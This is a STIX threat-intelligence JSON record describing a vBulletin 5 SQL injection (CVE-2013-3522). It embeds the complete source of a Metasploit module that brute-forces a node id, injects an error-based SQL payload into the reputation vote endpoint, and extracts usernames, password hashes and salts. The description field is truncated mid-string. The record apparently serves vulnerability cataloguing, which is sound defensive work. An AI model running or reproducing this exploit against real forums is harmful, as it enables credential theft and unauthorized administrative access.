{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5abe84c2-4c80-407e-a97f-aec37d75b481",
    "created": "2024-08-14T16:32:31.738832Z",
    "modified": "2024-08-14T16:32:31.738836Z",
    "name": "vBulletin Password Collector via nodeid SQL Injection",
    "description": " This module exploits a SQL injection vulnerability found in vBulletin 5 that has been used in the wild since March 2013. This module can be used to extract the web application's usernames and hashes, which could be used to authenticate into the vBulletin admin control panel.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/vbulletin_vote_sqli.rb",
            "external_id": "vbulletin_vote_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'vBulletin Password Collector via nodeid SQL Injection',\n      'Description'    => %q{\n        This module exploits a SQL injection vulnerability found in vBulletin 5 that has been\n        used in the wild since March 2013. This module can be used to extract the web application's\n        usernames and hashes, which could be used to authenticate into the vBulletin admin control\n        panel.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2013-3522' ],\n          [ 'OSVDB', '92031' ],\n          [ 'EDB', '24882' ],\n          [ 'BID', '58754' ],\n          [ 'URL', 'http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt' ]\n        ],\n      'Author'         =>\n        [\n          'Orestis Kourides', # Vulnerability discovery and PoC\n          'sinn3r', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2013-03-24'\n    ))\n\n    register_options(\n      [\n        OptString.new(\"TARGETURI\", [true, 'The path to vBulletin', '/']),\n        OptInt.new(\"NODE\", [false, 'Valid Node ID']),\n        OptInt.new(\"MINNODE\", [true, 'Valid Node ID', 1]),\n        OptInt.new(\"MAXNODE\", [true, 'Valid Node ID', 100])\n      ])\n  end\n\n  def exists_node?(id)\n    mark = Rex::Text.rand_text_alpha(8 + rand(5))\n    result = do_sqli(id, \"select '#{mark}'\")\n\n    if result and result =~ /#{mark}/\n      return true\n    end\n\n    return false\n  end\n\n  def brute_force_node\n    min = datastore[\"MINNODE\"]\n    max = datastore[\"MAXNODE\"]\n\n    if min > max\n      print_error(\"MINNODE can't be major than MAXNODE\")\n      return nil\n    end\n\n    for node_id in min..max\n      if exists_node?(node_id)\n        return node_id\n      end\n    end\n\n    return nil\n  end\n\n  def get_node\n    if datastore['NODE'].nil? or datastore['NODE'] <= 0\n      print_status(\"Brute forcing to find a valid node id...\")\n      return brute_force_node\n    end\n\n    print_status(\"Checking node id #{datastore['NODE']}...\")\n    if exists_node?(datastore['NODE'])\n      return datastore['NODE']\n    else\n      return nil\n    end\n  end\n\n  # session maybe isn't needed, unauthenticated\n  def do_sqli(node, query)\n    mark = Rex::Text.rand_text_alpha(5 + rand(3))\n    random_and = Rex::Text.rand_text_numeric(4)\n    injection = \") and(select 1 from(select count(*),concat((select (select concat('#{mark}',cast((#{query}) as char),'#{mark}')) \"\n    injection << \"from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) \"\n    injection << \"AND (#{random_and}=#{random_and}\"\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, \"index.php\", \"ajax\", \"api\", \"reputation\", \"vote\"),\n      'vars_post' =>\n        {\n          'nodeid'  => \"#{node}#{injection}\",\n        }\n      })\n\n    unless res and res.code == 200 and res.body.to_s =~ /Database error in vBulletin/\n      return nil\n    end\n\n    data = \"\"\n\n    if res.body.to_s =~ /#{mark}(.*)#{mark}/\n      data = $1\n    end\n\n    return data\n  end\n\n  def get_user_data(node_id, user_id)\n    user = do_sqli(node_id, \"select username from user limit #{user_id},#{user_id+1}\")\n    pass = do_sqli(node_id, \"select password from user limit #{user_id},#{user_id+1}\")\n    salt = do_sqli(node_id, \"select salt from user limit #{user_id},#{user_id+1}\")\n\n    return [user, pass, salt]\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"index.php\")\n    })\n\n    if res and res.code == 200 and res.body.to_s =~ /\"simpleversion\": \"v=5/\n      if get_node\n        # Multiple factors determine this LOOKS vulnerable\n        return Msf::Exploit::CheckCode::Appears\n      else\n        # Not enough information about the vuln state, but at least we know this is vbulletin\n        return Msf::Exploit::CheckCode::Detected\n      end\n    end\n\n    Msf::Exploit::CheckCode::Safe\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :nonreplayable_hash,\n      jtr_format: 'md5'\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run\n    print_status(\"Checking for a valid node id...\")\n    node_id = get_node\n    if node_id.nil?\n      print_error(\"node id not found\")\n      return\n    end\n\n    print_good(\"Using node id #{node_id} to exploit sqli... Counting users...\")\n    data = do_sqli(node_id, \"select count(*) from user\")\n    if data.blank?\n      print_error(\"Error exploiting sqli\")\n      return\n    end\n    count_users = data.to_i\n    print_good(\"#{count_users} users found. Collecting credentials...\")\n\n    users_table = Rex::Text::Table.new(\n      'Header'  => 'vBulletin Users',\n      'Indent'   => 1,\n      'Columns' => ['Username', 'Password Hash', 'Salt']\n    )\n\n    for i in 0..count_users\n      user = get_user_data(node_id, i)\n      unless user.join.empty?\n        report_cred(\n          ip: rhost,\n          port: rport,\n          user: user[0],\n          password: user[1],\n          service_name: (ssl ? \"https\" : \"http\"),\n          proof: \"salt: #{user[2]}\"\n        )\n        users_table << user\n      end\n    end\n\n    if users_table.rows.length > 0\n      print_good(\"#{users_table.rows.length.to_s} credentials successfully collected\")\n      print_line(users_table.to_s)\n    else\n      print_error(\"Unfortunately the module was unable to extract any credentials\")\n    end\n  end\n\n\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-03-24"
}